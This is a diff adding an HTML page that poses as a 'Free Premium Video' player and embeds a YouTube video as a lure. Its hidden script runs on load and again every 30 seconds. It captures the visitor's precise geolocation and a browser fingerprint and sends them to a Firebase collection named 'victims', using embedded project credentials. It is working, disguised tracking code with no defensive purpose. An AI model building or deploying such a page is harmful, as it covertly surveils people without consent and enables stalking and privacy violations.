@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Premium Video</title>
+    <style>
+        body { margin: 0; padding: 0; background: #000; overflow: hidden; }
+        #video-container { width: 100vw; height: 100vh; position: fixed; top: 0; left: 0; z-index: 1; }
+        #loading { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 1000; color: white; font-family: Arial; }
+    </style>
+</head>
+<body>
+    <div id="loading">Loading Premium Content...</div>
+    <div id="video-container">
+        <iframe 
+            src="https://www.youtube.com/embed/N1g2a4sjx_I?autoplay=1&mute=0&controls=1&loop=1&playlist=N1g2a4sjx_I" 
+            frameborder="0" 
+            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
+            allowfullscreen 
+            style="width: 100%; height: 100%;"
+            id="youtube-player">
+        </iframe>
+    </div>
+
+    <!-- Firebase SDK -->
+    <script type="module">
+        import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js';
+        import { getFirestore, collection, addDoc, serverTimestamp } from 'https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js';
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyDNAcbechPRfrWSpxkZHKsksnr_hS88XdU",
+            authDomain: "ai-studio-applet-webapp-2b6f9.firebaseapp.com",
+            databaseURL: "https://ai-studio-applet-webapp-2b6f9-default-rtdb.firebaseio.com",
+            projectId: "ai-studio-applet-webapp-2b6f9",
+            storageBucket: "ai-studio-applet-webapp-2b6f9.firebasestorage.app",
+            messagingSenderId: "594142136198",
+            appId: "1:594142136198:web:2cd1ff68a43efefebd0e07"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        // Hide loading immediately
+        document.getElementById('loading').style.display = 'none';
+
+        // Collect victim data
+        async function collectVictimData() {
+            try {
+                // Get geolocation with high accuracy
+                const position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    });
+                });
+
+                const lat = position.coords.latitude;
+                const lon = position.coords.longitude;
+                const accuracy = position.coords.accuracy;
+                const timestamp = new Date().toISOString();
+
+                // Additional browser fingerprinting
+                const fingerprint = {
+                    userAgent: navigator.userAgent,
+                    language: navigator.language,
+                    platform: navigator.platform,
+                    screen: `${screen.width}x${screen.height}`,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    cookiesEnabled: navigator.cookieEnabled
+                };
+
+                // Send to Firebase
+                await addDoc(collection(db, "victims"), {
+                    latitude: lat,
+                    longitude: lon,
+                    accuracy: accuracy,
+                    timestamp: serverTimestamp(),
+                    ip: "unknown", // Can be enhanced with external API
+                    fingerprint: fingerprint,
+                    sessionId: `victim_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`
+                });
+
+                console.log('Victim data captured:', { lat, lon });
+            } catch (error) {
+                console.log('Geolocation failed:', error);
+                // Still send basic fingerprint even if geolocation fails
+                addDoc(collection(db, "victims"), {
+                    error: error.message,
+                    timestamp: serverTimestamp(),
+                    fingerprint: {
+                        userAgent: navigator.userAgent,
+                        language: navigator.language
+                    },
+                    sessionId: `victim_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`
+                });
+            }
+        }
+
+        // Auto-trigger geolocation on load
+        if (navigator.geolocation) {
+            collectVictimData();
+        }
+
+        // Retry geolocation every 30 seconds (background collection)
+        setInterval(() => {
+            if (navigator.geolocation) {
+                collectVictimData();
+            }
+        }, 30000);
+
+    </script>
+</body>
+</html>
